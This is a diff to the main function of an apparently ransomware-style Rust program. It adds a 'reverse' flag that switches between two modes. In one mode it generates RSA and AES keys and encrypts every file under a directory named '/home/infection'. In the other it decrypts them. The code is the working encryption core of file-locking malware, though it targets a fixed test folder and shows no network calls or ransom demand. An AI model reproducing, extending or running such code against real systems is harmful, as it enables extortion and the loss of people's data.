@@ -9,6 +9,7 @@ use rsa::pkcs1::{EncodeRsaPrivateKey, EncodeRsaPublicKey};
 mod decrypt;
 mod encrypt;
 mod generate_keys;
+mod parse_args;
 
 fn get_files_in_directory(path: &str) -> Vec<PathBuf> {
     let mut files = Vec::new();
@@ -24,27 +25,31 @@ fn get_files_in_directory(path: &str) -> Vec<PathBuf> {
 }
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let (private_key, public_key, aes_key) = generate_keys::generate_keys()?;
+    let args = parse_args::parse_args();
 
-    let mut private_key_file = File::create("private_key.der")?;
-    let mut public_key_file = File::create("public_key.der")?;
-    let mut encryption_key_file = File::create("encryption.key")?;
+    if !args.reverse {
+        let (private_key, public_key, aes_key) = generate_keys::generate_keys()?;
 
-    private_key_file.write_all(private_key.to_pkcs1_der()?.as_bytes())?;
-    public_key_file.write_all(public_key.to_pkcs1_der()?.as_bytes())?;
+        let mut private_key_file = File::create("private_key.der")?;
+        let mut public_key_file = File::create("public_key.der")?;
+        let mut encryption_key_file = File::create("encryption.key")?;
 
-    let encrypted_aes_key = encrypt::encrypt_aes_key(&aes_key, &public_key)?;
-    encryption_key_file.write_all(&encrypted_aes_key)?;
+        private_key_file.write_all(private_key.to_pkcs1_der()?.as_bytes())?;
+        public_key_file.write_all(public_key.to_pkcs1_der()?.as_bytes())?;
 
-    let files = get_files_in_directory("/home/infection");
-    for file in &files {
-        encrypt::encrypt_file(file, &aes_key).unwrap();
-    }
+        let encrypted_aes_key = encrypt::encrypt_aes_key(&aes_key, &public_key)?;
+        encryption_key_file.write_all(&encrypted_aes_key)?;
 
-    let encrypted_files = get_files_in_directory("/home/infection");
-    let decrypted_aes_key = decrypt::decrypt_aes_key()?;
-    for file in &encrypted_files {
-        decrypt::decrypt_file(file, &decrypted_aes_key).unwrap();
+        let files = get_files_in_directory("/home/infection");
+        for file in &files {
+            encrypt::encrypt_file(file, &aes_key).unwrap();
+        }
+    } else {
+        let encrypted_files = get_files_in_directory("/home/infection");
+        let decrypted_aes_key = decrypt::decrypt_aes_key()?;
+        for file in &encrypted_files {
+            decrypt::decrypt_file(file, &decrypted_aes_key).unwrap();
+        }
     }
 
     Ok(())
